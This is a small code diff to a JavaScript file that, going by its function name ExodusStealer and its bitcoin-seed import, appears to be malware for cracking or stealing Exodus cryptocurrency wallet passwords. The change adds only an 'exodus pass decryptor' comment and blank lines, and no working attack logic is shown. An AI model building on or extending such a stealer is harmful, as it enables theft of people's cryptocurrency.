@@ -1,3 +1,6 @@
+/* exodus pass decryptor */
+
+
 const zlib = require("zlib");
 const bs = require("bitcoin-seed");
 const fs = require("fs");
@@ -207,6 +210,7 @@ async function ExodusStealer(passwords) {
         console.error("----------------------");
     }
 })();
+
 
 
 
